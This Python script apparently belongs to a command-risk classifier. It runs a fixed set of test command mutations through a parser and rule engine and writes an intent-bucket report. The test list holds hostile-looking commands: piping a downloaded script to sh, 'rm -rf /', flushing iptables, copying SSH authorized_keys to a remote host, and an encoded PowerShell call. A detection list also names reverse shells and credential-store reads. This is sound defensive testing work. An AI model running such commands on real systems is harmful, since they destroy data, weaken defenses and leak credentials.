#!/usr/bin/env python3
"""Generate a grouped Tier 2 command mutation matrix and intent report."""
from __future__ import annotations

import argparse
import json
from pathlib import Path

from parser import parse_command
from semantic_features import build_semantic_features
from rule_engine import build_rule_result


MUTATIONS = {
    "curl": [
        "curl -I https://example.com",
        "curl -fsSL https://example.com/tool.sh -o /tmp/tool.sh",
        "curl -fsSL https://example.com/tool.sh | sh",
    ],
    "powershell": [
        "powershell -NoProfile -Command Get-Process",
        "powershell -NoProfile -Command Get-Content C:\\Temp\\report.txt",
        "powershell -NoProfile -EncodedCommand SQBFAFgA",
    ],
    "python": [
        "python3 -c \"print(1)\"",
        "python3 script.py --input report.txt",
        "python3 -c \"import os; os.system('id')\"",
    ],
    "file_operations": [
        "ls -la",
        "rm -rf /tmp/example",
        "rm -rf /",
    ],
    "network_admin": [
        "ip addr",
        "iptables -L",
        "iptables -F",
    ],
    "remote_transfer": [
        "scp report.txt audit@example.org:/srv/audit/",
        "scp ~/.ssh/authorized_keys audit@example.org:/tmp/",
        "ssh admin@example.org 'uname -a'",
    ],
    "persistence": [
        "crontab -l",
        "crontab -e",
        "systemctl enable example.service",
    ],
}


def classify(semantic: dict, rules: dict) -> str:
    high_signal = {
        "executes_inline_code", "uses_encoded_payload", "uses_obfuscation",
        "reads_credential_store", "creates_scheduled_task",
        "modifies_registry_autorun", "deletes_shadow_copies",
        "has_destructive_write", "has_pipe_to_shell", "has_reverse_shell_pattern",
        "has_defense_impairment", "has_persistence_change",
    }
    if any(semantic.get(key) for key in high_signal):
        return "high_signal"
    if rules.get("rule_strength") == "strong":
        return "high_signal"
    if rules.get("rule_strength") == "weak" or any(
        semantic.get(key) for key in (
            "enumerates_identity", "enumerates_network_config", "enumerates_users_or_groups",
            "downloads_remote_resource", "transfers_file_to_remote", "remote_execution_or_session",
            "runs_interpreter", "uses_signed_proxy_binary",
        )
    ):
        return "context_dependent"
    return "routine_candidate"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", type=Path, required=True)
    args = parser.parse_args()
    args.output.parent.mkdir(parents=True, exist_ok=True)
    rows = []
    for group, commands in MUTATIONS.items():
        for index, command in enumerate(commands):
            parsed = parse_command(command, deobfuscate_input=False)
            semantic = build_semantic_features(parsed)
            rules = build_rule_result(parsed, semantic)
            rows.append({
                "group": group,
                "mutation_index": index,
                "command": command,
                "intent_bucket": classify(semantic, rules),
                "executable": parsed.get("executable"),
                "subcommand": parsed.get("subcommand"),
                "flags": parsed.get("flags", []),
                "positional_args": parsed.get("positional_args", []),
                "operators": parsed.get("operators", []),
                "remote_targets": parsed.get("remote_targets", []),
                "local_targets": parsed.get("local_targets", []),
                "semantic_features": {key: value for key, value in semantic.items() if value},
                "rule_strength": rules.get("rule_strength", "none"),
                "fired_rules": rules.get("fired_rules", []),
                "rule_evidence": rules.get("evidence", []),
            })
    args.output.write_text("".join(json.dumps(row, ensure_ascii=True) + "\n" for row in rows), encoding="utf-8")
    summary = {}
    for row in rows:
        summary[row["intent_bucket"]] = summary.get(row["intent_bucket"], 0) + 1
    print(json.dumps({"output": str(args.output), "rows": len(rows), "intent_buckets": summary}, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
